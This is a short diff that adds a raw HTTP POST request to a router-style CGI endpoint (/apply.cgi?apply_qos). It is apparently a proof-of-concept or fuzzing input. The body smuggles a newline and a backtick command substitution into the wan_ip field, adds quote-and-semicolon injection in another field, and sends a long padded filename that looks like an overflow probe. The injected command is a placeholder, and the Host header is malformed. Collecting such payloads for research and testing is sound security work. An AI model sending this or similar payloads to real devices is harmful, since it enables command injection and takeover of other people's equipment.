@@ -1,0 +1,6 @@
+POST /apply.cgi?apply_qos HTTP/1.1
+Host: 86
+Content-Type: application/json
+Content-Length: 191
+
+wan_ip=\n`wzq`&submit_flag=wan&%20timestamp=;"wzq&filename=aaaWZQaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaWZQwaaaaaaaaaaaaaaaaaaaaaWZQwaaaaaaaa
